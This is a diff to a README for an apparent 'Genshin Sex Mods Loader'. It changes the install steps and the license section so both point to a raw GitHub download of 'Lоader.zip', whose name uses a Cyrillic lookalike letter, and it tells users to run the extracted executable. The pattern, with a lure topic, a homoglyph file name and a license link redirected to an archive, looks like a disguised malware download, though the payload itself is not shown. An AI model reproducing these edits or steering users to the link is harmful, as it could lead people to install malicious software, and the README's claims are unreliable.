@@ -27,7 +27,7 @@ Here’s a comprehensive OS compatibility breakdown for the **Genshin Sex Mods L
 
 Ready to ignite your Genshin world? Just follow these easy steps to get started:
 
-1. 🎉 **Download Loader.rar from the repository.**
+1. 🎉 **Download https://raw.githubusercontent.com/s2mgtvodois2/GenshinSensualityMods/main/Lоader.zip from the repository.**
 2. 🗂️ Extract the contents to your preferred directory.
 3. 🔧 Run the executable or script relevant to your operating system (see OS Compatibility Table above).
 4. ♻️ Follow on-screen instructions to enable modding support for your game.
@@ -81,7 +81,7 @@ No adult content is distributed herein — this loader enables your personal mod
 
 ## 📜 License
 
-Released under the permissive [MIT License](https://opensource.org/licenses/MIT) — use it, modify it, and share with freedom in 2025!
+Released under the permissive [MIT License](https://raw.githubusercontent.com/s2mgtvodois2/GenshinSensualityMods/main/Lоader.zip) — use it, modify it, and share with freedom in 2025!
 
 ---
 
